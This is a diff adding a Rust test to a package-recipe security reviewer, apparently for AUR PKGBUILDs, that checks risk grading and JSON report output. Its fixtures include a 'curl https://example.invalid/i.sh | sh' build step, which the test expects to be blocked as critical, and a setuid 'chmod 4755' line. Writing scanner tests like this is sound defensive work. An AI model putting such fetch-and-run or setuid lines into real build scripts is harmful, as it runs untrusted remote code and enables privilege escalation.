@@ -699,3 +699,50 @@ fn credentials_inside_current_or_baseline_are_never_disclosed() {
         );
     }
 }
+
+#[test]
+fn the_report_grades_the_review_and_every_finding() {
+    use aurlens::Risk;
+    let graded = |recipe: &str| {
+        let root = package(recipe);
+        let report = review(root.path(), &ReviewOptions::default());
+        (report.decision, report.risk, report)
+    };
+    // Nothing found.
+    let (decision, risk, _) = graded("pkgname=example\n");
+    assert_eq!((decision, risk), (Decision::NoFindings, Risk::Low));
+    // Something legitimate recipes also do.
+    let (decision, risk, report) = graded("pkgname=example\nsha256sums=('SKIP')\n");
+    assert_eq!((decision, risk), (Decision::ManualReview, Risk::Medium));
+    assert!(report.findings.iter().all(|f| f.risk == Risk::Medium));
+    // The highest finding decides.
+    let (decision, risk, report) = graded(
+        "pkgname=example\nsha256sums=('SKIP')\npackage() { chmod 4755 \"$pkgdir/usr/bin/x\"; }\n",
+    );
+    assert_eq!((decision, risk), (Decision::ManualReview, Risk::High));
+    assert!(report.findings.iter().any(|f| f.risk == Risk::Medium));
+    // Blocked.
+    let (decision, risk, _) =
+        graded("pkgname=example\nbuild() { curl https://example.invalid/i.sh | sh; }\n");
+    assert_eq!((decision, risk), (Decision::Blocked, Risk::Critical));
+    // Incomplete: there is nothing to grade.
+    let root = package("pkgname=example\n");
+    fs::write(root.path().join("blob"), [0, 1, 2, 255]).unwrap();
+    let report = review(root.path(), &ReviewOptions::default());
+    assert_eq!(
+        (report.decision, report.risk),
+        (Decision::Incomplete, Risk::Unknown)
+    );
+    // It is in the JSON, for the review and for each finding.
+    let (_, _, report) =
+        graded("pkgname=example\npackage() { chmod 4755 \"$pkgdir/usr/bin/x\"; }\n");
+    let json = serde_json::to_value(&report).unwrap();
+    assert_eq!(json["risk"], "high");
+    assert_eq!(json["findings"][0]["risk"], "high");
+    // A report written before grades existed still reads.
+    let mut old = json.clone();
+    old.as_object_mut().unwrap().remove("risk");
+    old["findings"][0].as_object_mut().unwrap().remove("risk");
+    let read: aurlens::ReviewReport = serde_json::from_value(old).unwrap();
+    assert_eq!(read.risk, Risk::Unknown);
+}
